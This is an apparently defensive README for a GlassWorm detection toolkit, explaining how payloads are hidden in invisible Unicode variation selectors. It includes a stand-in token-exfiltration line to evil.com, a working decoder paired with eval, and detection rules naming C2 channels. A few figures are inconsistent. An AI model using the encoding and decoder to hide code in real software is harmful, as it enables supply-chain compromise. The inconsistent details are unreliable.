# GlassWorm Toolkit — Invisible Unicode Attack Detection & Education

<p align="center">
  <img src="https://img.shields.io/badge/purpose-educational-blue?style=flat-square" alt="Educational">
  <img src="https://img.shields.io/badge/python-3.8+-green?style=flat-square" alt="Python 3.8+">
  <img src="https://img.shields.io/badge/dependencies-zero-brightgreen?style=flat-square" alt="Zero Dependencies">
  <img src="https://img.shields.io/badge/payloads-harmless%20only-orange?style=flat-square" alt="Safe">
  <img src="https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square" alt="MIT">
</p>

A hands-on toolkit for **security engineers and pentesters** to understand, detect, and defend against the [GlassWorm](https://www.koi.ai/blog/glassworm-first-self-propagating-worm-using-invisible-code-hits-openvsx-marketplace) supply chain malware — the first self-propagating worm that hides malicious payloads inside invisible Unicode characters in VS Code extensions, npm packages, and GitHub repositories.

> **All payloads in this toolkit are harmless** (`console.log("Hello from invisible code!")`). This is purely an educational and defensive resource.

---

## What is GlassWorm?

GlassWorm was [discovered by Koi Security](https://www.darkreading.com/application-security/self-propagating-glassworm-vs-code-supply-chain) in October 2025. It uses **invisible Unicode Variation Selector characters** (`U+FE00`–`U+FE0F`) to encode entire malicious JavaScript payloads that are physically present in a file but render as blank space in every mainstream code editor, terminal, and diff tool.

**The attack in 30 seconds:**

```
1. Malicious JS payload       "fetch('https://evil.com/steal?t=' + token)"
                                          ↓
2. Split each byte             'f' (0x66) → high nibble: 6, low nibble: 6
                                          ↓
3. Map to invisible chars      6 → U+FE06 (invisible), 6 → U+FE06 (invisible)
                                          ↓
4. Inject into extension       Line 2 looks EMPTY but has 100s of invisible chars
                                          ↓
5. Decoder reverses it         codePointAt(i) - 0xFE00 → nibble → byte → char
                                          ↓
6. eval() executes it          💥 Hidden code runs with full extension privileges
```

As of March 2026, GlassWorm has gone through **5 waves**, infecting 35,800+ machines, 150+ GitHub repos, 72+ malicious OpenVSX extensions, and expanding to npm and AI development tooling (MCP packages).

---

## What's in this Toolkit

| File | Purpose |
|---|---|
| `glassworm_scanner.py` | **Detection scanner** — scans files/directories for GlassWorm indicators (8 detection rules) |
| `glassworm_test_generator.py` | **Test sample generator** — creates safe test files to validate your scanner |
| `glassworm_educational_demo.py` | **Interactive CLI walkthrough** — step-by-step explanation of the encoding technique |
| `pre-commit-hook.sh` | **Git pre-commit hook** — blocks commits containing invisible Unicode payloads |
| `fake_infected_extension.js` | **Sample infected file** — a harmless VS Code extension with invisible payload on line 2 |
| `glassworm_explained.html` | **Interactive web page** — visual explainer with live encoder/decoder you can try in-browser |

---

## Quick Start

### 1. Scan your VS Code extensions (do this first!)

```bash
# No dependencies needed — pure Python 3

# macOS / Linux
python3 glassworm_scanner.py ~/.vscode/extensions/

# Windows (PowerShell)
python3 glassworm_scanner.py "$env:USERPROFILE\.vscode\extensions\"

# With detailed character positions
python3 glassworm_scanner.py ~/.vscode/extensions/ --verbose

# Extended mode (catches Private Use Area abuse too)
python3 glassworm_scanner.py ~/.vscode/extensions/ --extended
```

### 2. Generate test samples and verify detection

```bash
# Create 8 safe test files mimicking different GlassWorm patterns
python3 glassworm_test_generator.py

# Scan them — all malicious patterns should be caught, clean file should pass
python3 glassworm_scanner.py glassworm_test_samples/
python3 glassworm_scanner.py glassworm_test_samples/test_06_clean_file.js  # should show ✓
```

### 3. Learn the technique interactively

```bash
# Terminal walkthrough (10 steps, pauses between each)
python3 glassworm_educational_demo.py

# Or open the web version in your browser
open glassworm_explained.html    # macOS
xdg-open glassworm_explained.html  # Linux
```

### 4. Protect your repos with the pre-commit hook

```bash
# Install in any git repo
cp pre-commit-hook.sh /path/to/your/repo/.git/hooks/pre-commit
chmod +x /path/to/your/repo/.git/hooks/pre-commit

# Now any commit with invisible Unicode payloads will be blocked
```

---

## Scanner Reference

### Usage

```bash
python3 glassworm_scanner.py <file_or_directory> [options]
```

### Options

| Flag | Description |
|---|---|
| `--verbose` | Show character-level details (code points, positions) |
| `--json` | Output structured JSON (for CI/CD integration) |
| `--extended` | Include Private Use Area ranges (wider net, more false positives) |

### Exit Codes

| Code | Meaning |
|---|---|
| `0` | Clean — no critical or high findings |
| `1` | Infected — critical or high severity findings detected |
| `2` | Error — file/path not found |

### Detection Rules

The scanner runs **8 detection rules** across multiple layers:

| Rule | Severity | What it catches |
|---|---|---|
| `GLASSWORM_PAYLOAD` | CRITICAL | 10+ variation selectors in a JS/TS file |
| `DECODER_NEAR_PAYLOAD` | CRITICAL | Decoder signatures (`0xFE00`, `codePointAt`) near invisible chars |
| `SUSPICIOUS_VS_CLUSTER` | MEDIUM | 3+ variation selectors in any file |
| `INVISIBLE_CHAR_DENSITY` | HIGH/MEDIUM | 5+ invisible Unicode characters on a single line |
| `DECODER_SIGNATURE` | HIGH | GlassWorm decoder constants without nearby invisible chars |
| `EVAL_STRING_CONSTRUCTION` | HIGH | `eval()` combined with string reconstruction patterns |
| `BLOCKCHAIN_C2` | MEDIUM | Solana RPC references in non-blockchain code |
| `GCAL_C2_POSSIBLE` | LOW | Google Calendar API references (GlassWorm backup C2) |
| `MID_FILE_BOM` | MEDIUM | BOM character mid-file (injection marker) |
| `SUSPICIOUS_LIFECYCLE_SCRIPT` | HIGH | Malicious `postinstall`/`preinstall` in package.json |

### CI/CD Integration

```yaml
# GitHub Actions example
- name: GlassWorm scan
  run: |
    python3 glassworm_scanner.py ./src --json > scan-results.json
    if [ $? -ne 0 ]; then
      echo "::error::GlassWorm indicators detected!"
      cat scan-results.json
      exit 1
    fi
```

```yaml
# GitLab CI example
glassworm-scan:
  stage: security
  script:
    - python3 glassworm_scanner.py . --json > glassworm-report.json
  artifacts:
    paths:
      - glassworm-report.json
    when: always
  allow_failure: false
```

---

## How the Invisible Encoding Works

This is the core of the attack — understanding it is critical for detection.

### The 3-Step Encoding

```
Character:  'f'
Byte value:  0x66 (102 decimal, 01100011 binary)
                        │
        ┌───────────────┴───────────────┐
        │                               │
   High nibble: 6                 Low nibble: 6
   (byte >> 4) & 0x0F             byte & 0x0F
        │                               │
   6 + 0xFE00 = U+FE06           6 + 0xFE00 = U+FE06
        │                               │
   INVISIBLE CHAR ←──────────────→ INVISIBLE CHAR
```

**Why Variation Selectors?** Unicode has 16 of them (`U+FE00`–`U+FE0F`), designed to modify emoji rendering. A nibble (half a byte) holds values 0–15 — exactly 16 possibilities. So each nibble maps perfectly to one variation selector. Two invisible characters = one byte of payload.

### The Decoder (5 lines of JS)

```javascript
function decode(s) {
  let r = [];
  for (let i = 0; i < s.length; i += 2) {
    const high = s.codePointAt(i) - 0xFE00;     // invisible → nibble
    const low  = s.codePointAt(i + 1) - 0xFE00;
    r.push((high << 4) | low);                   // two nibbles → byte
  }
  return String.fromCharCode(...r);
}
// In real GlassWorm: eval(decode(invisibleString))
```

### What it Looks Like on Disk

A "blank" line containing the encoded payload looks like this in a hex editor:

```
EF B8 86  EF B8 83  EF B8 86  EF B8 8F  EF B8 86  EF B8 8E ...
└──────┘  └──────┘  └──────┘  └──────┘  └──────┘  └──────┘
 U+FE06    U+FE03    U+FE06    U+FE0F    U+FE06    U+FE0E
 nib: 6    nib: 3    nib: 6    nib: F    nib: 6    nib: E
 └── 'c' ──┘         └── 'o' ──┘         └── 'n' ──┘
```

Each invisible character is **3 UTF-8 bytes** on disk (`EF B8 8x` where `x` is the nibble value). A 60-character malicious payload becomes 120 invisible characters = **360 extra bytes** in what appears to be an empty line.

---

## GlassWorm Attack Timeline

| Date | Wave | Event |
|---|---|---|
| Mar 2025 | Pre | Aikido discovers invisible Unicode technique in npm packages |
| May 2025 | Pre | Veracode documents Unicode obfuscation + Google Calendar C2 in npm |
| Oct 17, 2025 | Wave 1 | 7 OpenVSX extensions compromised, 35,800 downloads, discovered by Koi Security |
| Oct 21, 2025 | — | Open VSX removes extensions, rotates tokens, declares contained |
| Oct 31, 2025 | Wave 2 | New extensions bypass OpenVSX defenses, 60+ orgs impacted |
| Nov 2025 | — | Attackers shift to GitHub repo compromises using stolen credentials |
| Dec 2025 | Wave 3 | 24 new packages on OpenVSX + Microsoft marketplace (Secure Annex) |
| Jan–Feb 2026 | Wave 4 | macOS pivot, encrypted JS payloads, hardware wallet trojanization |
| Mar 3–9, 2026 | Wave 5 | 151+ GitHub repos, npm packages, VS Code extensions — largest wave |

---

## Incident Response

If the scanner finds CRITICAL findings in your environment:

**Assume compromise.** Then:

1. **Rotate all secrets immediately** — NPM tokens, GitHub tokens, OpenVSX tokens, Git credentials, SSH keys, all passwords
2. **Revoke and regenerate API keys** — especially for cloud providers (AWS, GCP, Azure)
3. **Check for rogue processes** — look for SOCKS proxies and hidden VNC servers:
   ```bash
   # Check for suspicious listeners
   netstat -tlnp | grep -E ':(1080|5900|5901|4444|8888)'
   ss -tlnp | grep -E ':(1080|5900|5901|4444|8888)'
   
   # Check for suspicious node processes
   ps aux | grep -E 'node.*socks|vnc|proxy'
   ```
4. **Audit extension updates** — check `~/.vscode/extensions/` for recently modified files
5. **Scan all repositories** — especially `package.json` lifecycle scripts and recently merged PRs
6. **Check crypto wallets** — GlassWorm targets 49 wallet extensions
7. **Network forensics** — look for Solana RPC traffic (`api.mainnet-beta.solana.com`) and unusual Google Calendar API calls

---

## Other Detection Tools

This toolkit complements these purpose-built tools:

- **[glassworm-hunter](https://github.com/AfineLabs/glassworm-hunter)** — 14 detection rules, CI/CD ready, IoC matching
- **[anti-trojan-source](https://github.com/nicktorres/anti-trojan-source)** (Snyk) — category-based Unicode analysis, future-proof detection
- **[Aikido Safe Chain](https://github.com/AikidoSec/safe-chain)** — wraps npm/yarn/pnpm to block supply chain malware in real time

---

## References

- [Koi Security — GlassWorm: First Self-Propagating Worm Using Invisible Code](https://www.koi.ai/blog/glassworm-first-self-propagating-worm-using-invisible-code-hits-openvsx-marketplace) (Oct 2025)
- [Aikido — GlassWorm Returns: Invisible Unicode Malware in 150+ GitHub Repos](https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode) (Mar 2026)
- [Snyk — Defending Against GlassWorm](https://snyk.io/articles/defending-against-glassworm/) (Nov 2025)
- [Veracode — GlassWorm: The First Self-Propagating VS Code Extension Worm](https://www.veracode.com/blog/glassworm-vs-code-extension/) (Oct 2025)
- [Endor Labs — Invisible Threats: GlassWorm Unicode VS Code](https://www.endorlabs.com/reports/invisible-threats-glassworm-unicode-vscode) (2025)
- [Trojan Source — CVE-2021-42574](https://trojansource.codes/) (2021) — the foundational research
- [Dark Reading — Self-Propagating GlassWorm Poisons VS Code Extensions](https://www.darkreading.com/application-security/self-propagating-glassworm-vs-code-supply-chain) (Oct 2025)
- [BleepingComputer — GlassWorm Returns in Third Wave](https://www.bleepingcomputer.com/news/security/glassworm-malware-returns-in-third-wave-of-malicious-vs-code-packages/) (Dec 2025)

---

## Disclaimer

This toolkit is for **educational and defensive purposes only**. All payloads used are harmless (`console.log` statements). The tools are designed to help security teams understand the GlassWorm attack technique and detect it in their environments. Do not use these techniques for malicious purposes.

---

## Author

**Visagan S** — Security Engineer & Pentester

---

## License

MIT — Use freely, share widely, keep developers safe.
